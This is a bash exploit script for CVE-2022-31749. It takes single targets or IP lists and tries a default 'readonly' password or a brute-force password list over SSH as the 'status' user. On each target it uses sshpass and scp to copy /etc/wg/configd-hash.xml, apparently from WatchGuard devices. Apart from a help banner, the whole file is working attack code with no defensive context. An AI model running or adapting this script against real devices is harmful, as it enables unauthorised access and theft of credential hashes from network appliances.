#!/usr/bin/env bash

REGIME=$1
IP=$2
PASS=$3

# Checking if we have a target to attack
if [ -z "$IP" ];then
	REGIME="-h"
fi

# Small standart how-to.
if [ -z "$REGIME" ] || [ "$REGIME" == "-h" ] || [ $REGIME == "--help" ];then
	echo "-------------------Welcome-to-CVE-2022-31749-by-1veresk----------------+";
	echo "+----------------------------------------------------------------------+";
	echo "+-------------------For-The-Help---------------------------------------+";
	echo "Example#1: ./cve-2022-31749.sh -h--------------------------------------+";
	echo "Example#2: ./cve-2022-31749.sh --help----------------------------------+";
	echo "+-------------------For-The-URL-Check----------------------------------+";
	echo "Example#1: ./cve-2022-31749.sh -u <IP> <PASSWORD> [Default is 'readonly'";
	echo "+-------------------For-The-File-Check---------------------------------+";
	echo "Example#1: ./cve-2022-31749.sh -f <FILENAME>-<PASSFILE>----------------+";
	echo "+----------------------------------------------------------------------+";
	exit 1;
fi

# If PASS isn't mentioned - we stick the `readonly` as the most psycology powerfull one.
if [ -z "$PASS" ]; then 
	PASS="readonly";
fi
# Attacking Target
if [ -e "$IP" ];then
	while read LINE; do
		# Checking if we have one pass or a collection for brute
		if [ -e "$PASS" ];then
			while read PASSLINE; do
				echo "Attacking $LINE with pass = $PASSLINE"
				sshpass -f <(printf '%s\n' $PASSLINE) scp status@$LINE:/etc/wg/configd-hash.xml $LINE-configd-hash.xml
				echo $?
			done <$PASS
		else
			echo "Attacking $LINE with pass = $PASS"
			sshpass -f <(printf '%s\n' $PASS) scp status@$LINE:/etc/wg/configd-hash.xml $LINE-configd-hash.xml
			echo $?
		fi
	done <$IP	
else
	# Checking if we have one pass or a collection for brute
	if [ -e "$PASS" ];then
		while read PASSLINE; do
			echo "Attacking $IP with pass = $PASSLINE"
			sshpass -f <(printf '%s\n' $PASSLINE) scp status@$IP:/etc/wg/configd-hash.xml $IP-configd-hash.xml
			echo $?
		done <$PASS
	else
		echo "Attacking $IP with pass = $PASS"
		sshpass -f <(printf '%s\n' $PASS) scp status@$IP:/etc/wg/configd-hash.xml $IP-configd-hash.xml
		echo $?
	fi
fi